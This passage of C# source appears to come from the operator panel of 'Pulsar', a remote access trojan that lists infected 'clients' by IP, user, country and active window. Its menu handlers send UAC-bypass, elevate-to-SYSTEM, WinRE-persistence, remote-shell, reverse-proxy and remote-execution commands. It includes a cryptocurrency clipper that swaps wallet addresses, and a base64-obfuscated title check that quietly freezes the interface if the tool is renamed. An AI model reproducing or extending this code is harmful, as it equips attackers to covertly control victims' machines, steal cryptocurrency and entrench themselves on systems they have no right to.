                Directory.CreateDirectory(PulsarStuffDir);
            }
            File.WriteAllText(filePath, json);
        }

        private void LoadCryptoAddresses()
        {
            string filePath = Path.Combine(PulsarStuffDir, "crypto_addresses.json");
            if (File.Exists(filePath))
            {
                try
                {
                    string json = File.ReadAllText(filePath);
                    var data = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, object>>(json);

                    if (data != null)
                    {
                        var addressesJson = data["Addresses"].ToString();
                        var addresses = Newtonsoft.Json.JsonConvert.DeserializeObject<Dictionary<string, string>>(addressesJson);

                        if (addresses != null)
                        {
                            BTCTextBox.Text = addresses.ContainsKey("BTC") ? addresses["BTC"] : string.Empty;
                            LTCTextBox.Text = addresses.ContainsKey("LTC") ? addresses["LTC"] : string.Empty;
                            ETHTextBox.Text = addresses.ContainsKey("ETH") ? addresses["ETH"] : string.Empty;
                            XMRTextBox.Text = addresses.ContainsKey("XMR") ? addresses["XMR"] : string.Empty;
                            SOLTextBox.Text = addresses.ContainsKey("SOL") ? addresses["SOL"] : string.Empty;
                            DASHTextBox.Text = addresses.ContainsKey("DASH") ? addresses["DASH"] : string.Empty;
                            XRPTextBox.Text = addresses.ContainsKey("XRP") ? addresses["XRP"] : string.Empty;
                            TRXTextBox.Text = addresses.ContainsKey("TRX") ? addresses["TRX"] : string.Empty;
                            BCHTextBox.Text = addresses.ContainsKey("BCH") ? addresses["BCH"] : string.Empty;
                        }

                        ClipperCheckbox.Checked = data.ContainsKey("ClipperEnabled") && Convert.ToBoolean(data["ClipperEnabled"]);

                        ClipperCheckbox.Text = ClipperCheckbox.Checked ? "Stop" : "Start";
                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error loading crypto addresses: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

            string strAS = "UHVsc2Fy";

            if (!(this.Text.StartsWith(System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(strAS)))))
            {
                Task.Run(async () =>
                {
                    Random rnd = new Random();
                    await Task.Delay(TimeSpan.FromMinutes(rnd.Next(2, 4)));

                    while (true)
                    {
                        await Task.Delay(rnd.Next(2000, 5000));
                        this.Invoke((Action)(() =>
                        {
                            Thread.Sleep(rnd.Next(800, 1500));
                        }));
                    }
                });
            }
        }

        #endregion "Crypto Addresses"

        private void RefreshStarButtons()
        {
            if (!lstClients.Visible)
            {
                return;
            }

            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        foreach (ListViewItem item in lstClients.Items)
                        {
                            if (item.Tag is Client client)
                            {
                                bool found = false;
                                foreach (Control control in lstClients.Controls)
                                {
                                    if (control is Button button && button.Tag is Client buttonClient && buttonClient.Equals(client))
                                    {
                                        found = true;
                                        break;
                                    }
                                }

                                if (!found)
                                {
                                    AddStarButton(item, client);
                                }
                            }
                        }
                    }
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        private void AddStarButton(ListViewItem item, Client client)
        {
            if (!lstClients.Visible)
            {
                return;
            }

            var starButton = new Button
            {
                Size = new System.Drawing.Size(20, 20),
                FlatStyle = FlatStyle.Flat,
                Tag = client,
                BackColor = Color.Transparent,
                FlatAppearance = { BorderSize = 0 },
                Cursor = Cursors.Hand
            };

            starButton.Image = Favorites.IsFavorite(client.Value.UserAtPc) ?
                Properties.Resources.star_filled : Properties.Resources.star_empty;

            starButton.Click += StarButton_Click;

            lstClients.Controls.Add(starButton);

            UpdateStarButtonPosition(starButton, item);
            starButton.BringToFront();
        }

        private void UpdateStarButtonPosition(Control starControl, ListViewItem item)
        {
            if (item == null || starControl == null) return;

            var bounds = item.Bounds;
            int rightMargin = 23;

            if (lstClients.Items.Count > lstClients.ClientSize.Height / lstClients.GetItemRect(0).Height)
            {
                rightMargin += SystemInformation.VerticalScrollBarWidth;
            }

            starControl.Location = new Point(lstClients.Width - rightMargin, bounds.Top + (bounds.Height - starControl.Height) / 2);
        }

        private void StarButton_Click(object sender, EventArgs e)
        {
            if (sender is Control starControl && starControl.Tag is Client client)
            {
                Favorites.ToggleFavorite(client.Value.UserAtPc);

                if (starControl is Button button)
                {
                    button.Image = Favorites.IsFavorite(client.Value.UserAtPc) ?
                        Properties.Resources.star_filled : Properties.Resources.star_empty;
                }

                SortClientsByFavoriteStatus();
            }
        }

        private void SortClientsByFavoriteStatus()
        {
            lstClients.BeginUpdate();
            _visibleClients.Clear();

            // Remove all star buttons first
            var controlsToRemove = lstClients.Controls.Cast<Control>()
                .Where(c => c is Button && c.Tag is Client)
                .ToList();

            foreach (var control in controlsToRemove)
            {
                lstClients.Controls.Remove(control);
            }

            var allItems = new List<ListViewItem>();

            allItems.AddRange(lstClients.Items.Cast<ListViewItem>().Where(item => item.Tag is Client));

            allItems.AddRange(_allClientItems.Values);

            var sortedItems = allItems
                .Where(item => item.Tag is Client)
                .OrderBy(item => (item.Tag as Client)?.Value?.Country ?? "Unknown")
                .ThenByDescending(item => Favorites.IsFavorite((item.Tag as Client)?.Value?.UserAtPc ?? ""))
                .ToList();

            lstClients.Items.Clear();
            lstClients.Groups.Clear();
            _allClientItems.Clear();

            foreach (var item in sortedItems)
            {
                if (item.Tag is Client client)
                {
                    if (Settings.ShowCountryGroups)
                    {
                        string country = client.Value?.Country ?? "Unknown";
                        string countryWithCode = client.Value?.CountryWithCode ?? "Unknown";

                        var group = GetGroupFromCountry(country, countryWithCode);
                        item.Group = group;
                    }
                    else
                    {
                        item.Group = null;
                    }

                    if (ShouldShowClientInSearch(client, item))
                    {
                        lstClients.Items.Add(item);
                        _visibleClients.Add(client);
                    }
                    else
                    {
                        _allClientItems[client] = item;
                        _visibleClients.Remove(client);
                    }

                    SyncWpfEntryFromListViewItem(item);
                }
            }

            // Add star buttons back for each visible client
            foreach (ListViewItem item in lstClients.Items)
            {
                if (item.Tag is Client client)
                {
                    AddStarButton(item, client);
                }
            }

            lstClients.EndUpdate();
            wpfClientsHost?.RefreshSort();
            ApplyWpfSearchFilter();
        }

        private ListViewGroup GetGroupFromCountry(string country, string countryWithCode)
        {
            ListViewGroup lvg = null;
            foreach (var group in lstClients.Groups.Cast<ListViewGroup>().Where(group => group.Name == country))
            {
                lvg = group;
            }

            if (lvg == null)
            {
                lvg = new ListViewGroup
                {
                    Name = country,
                    Header = countryWithCode
                };
                lstClients.Groups.Add(lvg);
            }

            return lvg;
        }

        private void WpfClientsHost_SelectionChanged(object sender, EventArgs e)
        {
            if (_syncingSelection)
            {
                return;
            }

            try
            {
                _syncingSelection = true;
                SyncListViewSelectionFromWpf();
            }
            finally
            {
                _syncingSelection = false;
            }

            UpdateWindowTitle();
        }

        private void SyncListViewSelectionFromWpf()
        {
            if (wpfClientsHost == null)
            {
                return;
            }

            var selectedClients = wpfClientsHost.SelectedClients;

            lstClients.BeginUpdate();
            try
            {
                foreach (ListViewItem item in lstClients.Items)
                {
                    if (item.Tag is Client client)
                    {
                        item.Selected = selectedClients.Contains(client);
                    }
                }
            }
            finally
            {
                lstClients.EndUpdate();
            }
        }

        private void SyncWpfSelectionFromList()
        {
            if (wpfClientsHost == null)
            {
                return;
            }

            if (_syncingSelection)
            {
                return;
            }

            try
            {
                _syncingSelection = true;
                var selectedClients = lstClients.SelectedItems.Cast<ListViewItem>()
                    .Select(item => item.Tag as Client)
                    .Where(client => client != null)
                    .Cast<Client>()
                    .ToList();

                wpfClientsHost.SetSelectedClients(selectedClients);
            }
            finally
            {
                _syncingSelection = false;
            }
        }

        private void WpfClientsHost_FavoriteToggled(object sender, Client client)
        {
            if (client == null)
            {
                return;
            }

            Favorites.ToggleFavorite(client.Value.UserAtPc);

            lstClients.Invoke((MethodInvoker)SortClientsByFavoriteStatus);

            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                SyncWpfEntryFromListViewItem(item);
            }
        }

        private ImageSource GetFlagImageSource(int imageIndex)
        {
            if (imageIndex < 0 || imageIndex >= imgFlags.Images.Count)
            {
                return null;
            }

            if (_flagImageCache.TryGetValue(imageIndex, out var cached))
            {
                return cached;
            }

            using var ms = new MemoryStream();
            imgFlags.Images[imageIndex].Save(ms, ImageFormat.Png);
            var bitmap = new BitmapImage();
            using (var stream = new MemoryStream(ms.ToArray()))
            {
                bitmap.BeginInit();
                bitmap.CacheOption = BitmapCacheOption.OnLoad;
                bitmap.StreamSource = stream;
                bitmap.EndInit();
            }
            bitmap.Freeze();
            _flagImageCache[imageIndex] = bitmap;
            return bitmap;
        }

        private void SyncWpfEntryFromListViewItem(ListViewItem item)
        {
            if (wpfClientsHost == null)
            {
                return;
            }

            if (item?.Tag is not Client client)
            {
                return;
            }

            var entry = wpfClientsHost.AddOrUpdate(client, e =>
            {
                e.Ip = item.SubItems[0].Text;
                e.Nickname = item.SubItems[1].Text;
                e.Tag = item.SubItems[2].Text;
                e.UserAtPc = item.SubItems[3].Text;
                e.Version = item.SubItems[4].Text;
                e.Status = item.SubItems[STATUS_ID].Text;
                e.CurrentWindow = item.SubItems[CURRENTWINDOW_ID].Text;
                e.UserStatus = item.SubItems[USERSTATUS_ID].Text;
                e.CountryWithCode = item.SubItems[8].Text;
                e.Country = client.Value?.Country ?? "Unknown";
                e.OperatingSystem = item.SubItems.Count > 9 ? item.SubItems[9].Text : string.Empty;
                e.AccountType = item.SubItems.Count > 10 ? item.SubItems[10].Text : string.Empty;
                e.IsFavorite = Favorites.IsFavorite(client.Value.UserAtPc);
                e.ImageIndex = item.ImageIndex;
                e.FlagImage = GetFlagImageSource(item.ImageIndex);
                e.ToolTip = item.ToolTipText ?? string.Empty;
            });

            _clientEntryMap[client] = entry;
        }

        private void ApplyWpfSearchFilter()
        {
            if (wpfClientsHost == null)
            {
                return;
            }

            if (string.IsNullOrEmpty(_currentSearchFilter))
            {
                wpfClientsHost.ApplyFilter(null);
            }
            else
            {
                wpfClientsHost.ApplyFilter(entry => ShouldShowClientInSearch(entry.Client, entry));
            }
        }

        private void AddClientToListview(Client client)
        {
            if (client == null) return;
            string nickname = GetClientNickname(client);

            try
            {
                ListViewItem lvi = new ListViewItem(new string[]
                {
                    " " + (client.Value.PublicIP ?? client.EndPoint.Address.ToString()), nickname, client.Value.Tag,
                    client.Value.UserAtPc, client.Value.Version, "Connected", "", "Active", client.Value.CountryWithCode,
                    client.Value.OperatingSystem, client.Value.AccountType
                })

                { Tag = client, ImageIndex = client.Value.ImageIndex };

                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.BeginUpdate();

                        if (Settings.ShowCountryGroups)
                        {
                            string country = client.Value?.Country ?? "Unknown";
                            string countryWithCode = client.Value?.CountryWithCode ?? "Unknown";
                            lvi.Group = GetGroupFromCountry(country, countryWithCode);
                        }
                        else
                        {
                            lvi.Group = null;
                        }

                        if (ShouldShowClientInSearch(client, lvi))
                        {
                            lstClients.Items.Add(lvi);
                            AddStarButton(lvi, client);
                            _visibleClients.Add(client);
                        }
                        else
                        {
                            _allClientItems[client] = lvi;
                            _visibleClients.Remove(client);
                        }

                        SortClientsByFavoriteStatus();
                        lstClients.EndUpdate();
                    }
                    //lvi.UseItemStyleForSubItems = false;
                    //lvi.SubItems[4].ForeColor = Color.Green;
                });
                SyncWpfEntryFromListViewItem(lvi);
                ApplyWpfSearchFilter();
                EventLog(client.Value.UserAtPc + " Has connected.", "normal");
                UpdateWindowTitle();
            }
            catch (InvalidOperationException)
            {
            }
        }

        private string GetClientNickname(Client client)
        {
            if (client?.Value?.Id == null)
                return string.Empty;

            string jsonFilePath = Path.Combine(PulsarStuffDir, "client_info.json");

            try
            {
                var clientInfos = LoadClientInfos(jsonFilePath);
                if (clientInfos != null && clientInfos.ContainsKey(client.Value.Id))
                {
                    return clientInfos[client.Value.Id]?.Nickname ?? string.Empty;
                }
                return string.Empty;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error loading client nickname: {ex.Message}");
                return string.Empty;
            }
        }

        private Dictionary<string, ClientInfo> LoadClientInfos(string filePath)
        {
            try
            {
                if (!File.Exists(filePath))
                    return new Dictionary<string, ClientInfo>();

                string json = File.ReadAllText(filePath);

                if (string.IsNullOrWhiteSpace(json))
                    return new Dictionary<string, ClientInfo>();

                try
                {
                    var clientInfos = JsonConvert.DeserializeObject<Dictionary<string, ClientInfo>>(json);
                    return clientInfos ?? new Dictionary<string, ClientInfo>();
                }
                catch (JsonException)
                {
                    Debug.WriteLine("Failed to parse");
                }

                return new Dictionary<string, ClientInfo>();
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error reading client info: {ex.Message}");
                return new Dictionary<string, ClientInfo>();
            }
        }

        private void RemoveClientFromListview(Client client)
        {
            if (client == null) return;

            try
            {
                lstClients.Invoke((MethodInvoker)delegate
                {
                    lock (_lockClients)
                    {
                        lstClients.BeginUpdate();
                        foreach (ListViewItem lvi in lstClients.Items.Cast<ListViewItem>()
                            .Where(lvi => lvi != null && client.Equals(lvi.Tag)))
                        {
                            // Remove star button
                            var controlsToRemove = lstClients.Controls.Cast<Control>().Where(
                                c => c.Tag is Client buttonClient && buttonClient.Equals(client)).ToList();

                            foreach (var control in controlsToRemove)
                            {
                                lstClients.Controls.Remove(control);
                                control.Dispose();
                            }

                            lvi.Remove();
                            break;
                        }
                        lstClients.EndUpdate();
                    }
                });

                _allClientItems.Remove(client);
                _visibleClients.Remove(client);
                _clientEntryMap.Remove(client);
                wpfClientsHost?.Remove(client);
                ApplyWpfSearchFilter();

                UpdateWindowTitle();
                EventLog(client.Value.UserAtPc + " Has disconnected.", "normal");
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region Offline clients

        private void ScheduleStatsRefresh()
        {
            if (statsElementHost == null && heatMapElementHost == null)
            {
                return;
            }

            lock (_statsRefreshLock)
            {
                if (_statsRefreshPending)
                {
                    return;
                }

                _statsRefreshPending = true;
            }

            statsElementHost?.ShowLoading();
            heatMapElementHost?.ShowLoading();

            ThreadPool.QueueUserWorkItem(_ =>
            {
                ClientStatisticsSnapshot statsSnapshot;
                ClientGeoSnapshot geoSnapshot;

                try
                {
                    var allClients = OfflineClientRepository.GetAllClients();
                    statsSnapshot = ClientStatisticsService.CreateSnapshot(allClients);
                    geoSnapshot = ClientGeoStatisticsService.CreateSnapshot(allClients, statsSnapshot.GeneratedAtUtc);
                }
                catch (Exception ex)
                {
                    var message = ex.Message;
                    statsSnapshot = ClientStatisticsSnapshot.CreateError(message);
                    geoSnapshot = ClientGeoSnapshot.CreateError(message);
                }
                finally
                {
                    lock (_statsRefreshLock)
                    {
                        _statsRefreshPending = false;
                    }
                }

                if (!IsHandleCreated || IsDisposed)
                {
                    return;
                }

                try
                {
                    BeginInvoke((MethodInvoker)(() =>
                    {
                        if (statsSnapshot.HasError)
                        {
                            var message = statsSnapshot.ErrorMessage ?? "Unknown error";
                            statsElementHost?.ShowError(message);
                            heatMapElementHost?.ShowError(message);
                            return;
                        }

                        statsElementHost?.UpdateSnapshot(statsSnapshot);

                        if (geoSnapshot.HasError)
                        {
                            heatMapElementHost?.ShowError(geoSnapshot.ErrorMessage ?? "Unknown error");
                        }
                        else
                        {
                            heatMapElementHost?.UpdateSnapshot(geoSnapshot);
                        }
                    }));
                }
                catch (ObjectDisposedException)
                {
                }
            });
        }

        private void ScheduleOfflineListRefresh()
        {
            lock (_offlineRefreshLock)
            {
                if (_offlineRefreshPending)
                {
                    return;
                }

                _offlineRefreshPending = true;
            }

            ThreadPool.QueueUserWorkItem(_ =>
            {
                List<OfflineClientRecord> offlineClients;

                try
                {
                    offlineClients = OfflineClientRepository.GetClientsByOnlineState(false)?.ToList()
                        ?? new List<OfflineClientRecord>();
                    ApplyOfflineNicknames(offlineClients);
                    _cachedOfflineClients = offlineClients;
                }
                catch (Exception ex)
                {
                    offlineClients = new List<OfflineClientRecord>();
                    _cachedOfflineClients = offlineClients;
                    EventLog($"Failed to load offline clients: {ex.Message}", "error");
                }
                finally
                {
                    lock (_offlineRefreshLock)
                    {
                        _offlineRefreshPending = false;
                    }
                }

                if (!IsHandleCreated || IsDisposed)
                {
                    return;
                }

                try
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        PopulateOfflineClientsList(_cachedOfflineClients);
                        UpdateOfflineTabHeader(_cachedOfflineClients.Count);
                    }));
                }
                catch (ObjectDisposedException)
                {
                }
            });
        }

        private void ApplyOfflineNicknames(IList<OfflineClientRecord> clients)
        {
            if (clients == null || clients.Count == 0)
            {
                return;
            }

            string jsonFilePath = Path.Combine(PulsarStuffDir, "client_info.json");
            var nicknameMap = LoadClientInfos(jsonFilePath);

            foreach (var record in clients)
            {
                if (!string.IsNullOrEmpty(record.ClientId) && nicknameMap.TryGetValue(record.ClientId, out var info))
                {
                    record.Nickname = info?.Nickname;
                }
            }
        }

        private void PopulateOfflineClientsList(IReadOnlyList<OfflineClientRecord> clients)
        {
            if (lstOfflineClients == null || lstOfflineClients.IsDisposed)
            {
                return;
            }

            lstOfflineClients.BeginUpdate();
            try
            {
                lstOfflineClients.Items.Clear();

                if (clients == null)
                {
                    return;
                }

                foreach (var record in clients)
                {
                    var userAtPc = !string.IsNullOrEmpty(record.UserAtPc)
                        ? record.UserAtPc
                        : ComposeUserAtPc(record);

                    var lastSeen = record.LastSeenUtc?.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss") ?? "Unknown";
                    var firstSeen = record.FirstSeenUtc?.ToLocalTime().ToString("yyyy-MM-dd HH:mm:ss") ?? string.Empty;
                    var countryWithCode = GetCountryWithCode(record);

                    var item = new ListViewItem(new[]
                    {
                        " " + (record.PublicIP ?? "Unknown"),
                        record.Nickname ?? string.Empty,
                        record.Tag ?? string.Empty,
                        userAtPc,
                        record.Version ?? string.Empty,
                        lastSeen,
                        firstSeen,
                        countryWithCode,
                        record.OperatingSystem ?? string.Empty,
                        record.AccountType ?? string.Empty
                    })
                    {
                        Tag = record
                    };

                    if (record.ImageIndex >= 0 && record.ImageIndex < imgFlags.Images.Count)
                    {
                        item.ImageIndex = record.ImageIndex;
                    }

                    lstOfflineClients.Items.Add(item);
                }
            }
            finally
            {
                lstOfflineClients.EndUpdate();
            }
        }

        private static string ComposeUserAtPc(OfflineClientRecord record)
        {
            var username = record.Username ?? string.Empty;
            var pcName = record.PcName ?? string.Empty;

            if (string.IsNullOrEmpty(username) && string.IsNullOrEmpty(pcName))
            {
                return string.Empty;
            }

            if (!string.IsNullOrEmpty(username) && !string.IsNullOrEmpty(pcName))
            {
                return $"{username}@{pcName}";
            }

            return username + pcName;
        }

        private static string GetCountryWithCode(OfflineClientRecord record)
        {
            if (string.IsNullOrEmpty(record.Country))
            {
                return string.Empty;
            }

            if (string.IsNullOrEmpty(record.CountryCode))
            {
                return record.Country;
            }

            return $"{record.Country} [{record.CountryCode}]";
        }

        private void UpdateOfflineTabHeader(int offlineCount)
        {
            if (tabOfflineClients == null || tabOfflineClients.IsDisposed)
            {
                return;
            }

            var title = offlineCount > 0 ? $"Offline ({offlineCount})" : "Offline";
            tabOfflineClients.Text = title;
        }

        #endregion

        private readonly Dictionary<Client, Dictionary<string, object>> _pendingStatusUpdates = new Dictionary<Client, Dictionary<string, object>>();
        private readonly object _statusUpdateLock = new object();
        private bool _statusUpdatePending = false;

        private string _currentSearchFilter = "";
        private readonly Dictionary<Client, ListViewItem> _allClientItems = new Dictionary<Client, ListViewItem>();

        private void SetStatusByClient(object sender, Client client, string text)
        {
            QueueStatusUpdate(client, "status", text);
        }

        private void SetUserStatusByClient(object sender, Client client, UserStatus userStatus)
        {
            QueueStatusUpdate(client, "userStatus", userStatus.ToString());
        }

        private void SetUserActiveWindowByClient(object sender, Client client, string newWindow)
        {
            QueueStatusUpdate(client, "window", newWindow);
        }

        private void QueueStatusUpdate(Client client, string field, object value)
        {
            if (client == null) return;

            lock (_statusUpdateLock)
            {
                if (!_pendingStatusUpdates.ContainsKey(client))
                    _pendingStatusUpdates[client] = new Dictionary<string, object>();

                _pendingStatusUpdates[client][field] = value;

                if (!_statusUpdatePending)
                {
                    _statusUpdatePending = true;
                    ThreadPool.QueueUserWorkItem(_ => ProcessStatusUpdates());
                }
            }
        }

        private void ProcessStatusUpdates()
        {
            Thread.Sleep(50); //small delay for batched updates.

            Dictionary<Client, Dictionary<string, object>> updates;
            lock (_statusUpdateLock)
            {
                updates = new Dictionary<Client, Dictionary<string, object>>(_pendingStatusUpdates);
                _pendingStatusUpdates.Clear();
                _statusUpdatePending = false;
            }

            if (updates.Count == 0) return;

            this.BeginInvoke((MethodInvoker)delegate
            {
                lstClients.BeginUpdate();
                try
                {
                    foreach (var update in updates)
                    {
                        var item = lstClients.Items.Cast<ListViewItem>()
                            .FirstOrDefault(lvi => lvi != null && update.Key.Equals(lvi.Tag));

                        if (item != null)
                        {
                            foreach (var fieldUpdate in update.Value)
                            {
                                switch (fieldUpdate.Key)
                                {
                                    case "status":
                                        item.SubItems[STATUS_ID].Text = fieldUpdate.Value?.ToString();
                                        break;

                                    case "userStatus":
                                        item.SubItems[USERSTATUS_ID].Text = fieldUpdate.Value?.ToString();
                                        break;

                                    case "window":
                                        item.SubItems[CURRENTWINDOW_ID].Text = fieldUpdate.Value?.ToString();
                                        break;
                                }
                            }

                            SyncWpfEntryFromListViewItem(item);
                        }
                    }
                }
                finally
                {
                    lstClients.EndUpdate();
                }
            });
        }

        private void SetUserClipboardByClient(object sender, Client client, string clipboardText)
        {
            // looks clean
        }

        private ListViewItem GetListViewItemByClient(Client client)
        {
            if (client == null) return null;

            ListViewItem itemClient = null;

            lstClients.Invoke((MethodInvoker)delegate
            {
                itemClient = lstClients.Items.Cast<ListViewItem>()
                    .FirstOrDefault(lvi => lvi != null && client.Equals(lvi.Tag));
            });

            return itemClient;
        }

        private Client[] GetSelectedClients()
        {
            if (_currentAutoTaskContext != null)
            {
                return _currentAutoTaskContext.Clients;
            }

            if (wpfClientsHost != null)
            {
                return wpfClientsHost.SelectedClients.ToArray();
            }

            List<Client> clients = new List<Client>();

            lstClients.Invoke((MethodInvoker)delegate
            {
                lock (_lockClients)
                {
                    if (lstClients.SelectedItems.Count == 0) return;
                    clients.AddRange(
                        lstClients.SelectedItems.Cast<ListViewItem>()
                            .Where(lvi => lvi != null)
                            .Select(lvi => lvi.Tag as Client));
                }
            });

            return clients.ToArray();
        }

        private void ShowPopup(Client c)
        {
            try
            {
                this.Invoke((MethodInvoker)delegate
                {
                    if (c == null || c.Value == null) return;

                    notifyIcon.Visible = true;
                    notifyIcon.ShowBalloonTip(4000, string.Format("Client connected from {0}!", c.Value.Country),
                        string.Format("IP Address: {0}\nOperating System: {1}", c.Value.PublicIP ?? "Unknown",
                        c.Value.OperatingSystem), ToolTipIcon.Info);
                    notifyIcon.Visible = false;
                });
            }
            catch (InvalidOperationException)
            {
            }
        }

        #region "ContextMenuStrip"

        #region "Client Management"

        private void elevateClientPermissionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoAskElevate());
            }
        }

        private void elevateToSystemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoElevateSystem());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void deElevateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoDeElevate());
            }
        }

        private void uACBypassToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var selectedClients = GetSelectedClients();
            if (selectedClients.Length == 0) return;

            bool proceed = true;
            if (_currentAutoTaskContext == null)
            {
                var result = MessageBox.Show(
                    $"Are you sure you want to attempt UAC bypass on {selectedClients.Length} client(s)? If Pulsar is being ran in memory, it will fail and you will loose the client until their computer is restarted or until the client file is rerun.",
                    "Confirm UAC Bypass",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);
                proceed = result == DialogResult.Yes;
            }

            if (!proceed)
            {
                return;
            }

            foreach (Client c in selectedClients)
            {
                c.Send(new DoUACBypass());
            }
        }

        private void installWinresetSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoAddWinREPersistence());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void removeWinresetSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    c.Send(new DoRemoveWinREPersistence());
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void winRECustomFileForSurvivalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                bool isClientAdmin = c.Value.AccountType == "Admin" || c.Value.AccountType == "System";

                if (isClientAdmin)
                {
                    FrmCustomFileStarter frmCustomFile = new FrmCustomFileStarter(c, typeof(AddCustomFileWinRE), false);
                    frmCustomFile.ShowDialog();
                    frmCustomFile.Focus();
                }
                else
                {
                    MessageBox.Show("The client is not running as an Administrator. Please elevate the client's permissions and try again.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }
        }

        private void nicknameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmNickname frmSi = new FrmNickname(c);
                frmSi.NicknameSaved += FrmSi_NicknameSaved;
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void FrmSi_NicknameSaved(object sender, EventArgs e)
        {
            if (sender is FrmNickname frmNickname)
            {
                UpdateClientNickname(frmNickname.GetClient());
            }
        }

        private void UpdateClientNickname(Client client)
        {
            var item = GetListViewItemByClient(client);
            if (item != null)
            {
                item.SubItems[1].Text = GetClientNickname(client);
            }
        }

        private void updateToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients, true);
                frmRe.Show();
            }
        }

        private void reconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientReconnect());
            }
        }

        private void disconnectToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                c.Send(new DoClientDisconnect());
            }
        }

        private void uninstallToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var clients = GetSelectedClients();
            if (clients.Length == 0)
            {
                return;
            }

            bool proceed = true;
            if (_currentAutoTaskContext == null)
            {
                proceed = MessageBox.Show(
                    string.Format("Are you sure you want to uninstall the client on {0} computer\\s?", clients.Length),
                    "Uninstall Confirmation",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Question) == DialogResult.Yes;
            }

            if (!proceed)
            {
                return;
            }

            foreach (Client c in clients)
            {
                c.Send(new DoClientUninstall());
            }
        }

        #endregion "Client Management"

        #region "Administration"

        private void systemInformationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmSystemInformation frmSi = FrmSystemInformation.CreateNewOrGetExisting(c);
                frmSi.Show();
                frmSi.Focus();
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmFileManager frmFm = FrmFileManager.CreateNewOrGetExisting(c);
                frmFm.Show();
                frmFm.Focus();
            }
        }

        private void startupManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmStartupManager frmStm = FrmStartupManager.CreateNewOrGetExisting(c);
                frmStm.Show();
                frmStm.Focus();
            }
        }

        private void taskManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmTaskManager frmTm = FrmTaskManager.CreateNewOrGetExisting(c);
                frmTm.Show();
                frmTm.Focus();
            }
        }

        private void remoteShellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmRemoteShell frmRs = FrmRemoteShell.CreateNewOrGetExisting(c);
                frmRs.Show();
                frmRs.Focus();
            }
        }

        private void connectionsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Client c in GetSelectedClients())
            {
                FrmConnections frmCon = FrmConnections.CreateNewOrGetExisting(c);
                frmCon.Show();
                frmCon.Focus();
            }
        }

        private void reverseProxyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmReverseProxy frmRs = new FrmReverseProxy(clients);
                frmRs.Show();
            }
        }

        private void registryEditorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            var clients = GetSelectedClients();
            if (clients.Length == 0)
            {
                return;
            }

            foreach (Client c in clients)
            {
                FrmRegistryEditor frmRe = FrmRegistryEditor.CreateNewOrGetExisting(c);
                frmRe.Show();
                frmRe.Focus();
            }
        }

        private void localFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Client[] clients = GetSelectedClients();
            if (clients.Length > 0)
            {
                FrmRemoteExecution frmRe = new FrmRemoteExecution(clients);
                frmRe.Show();
            }
        }

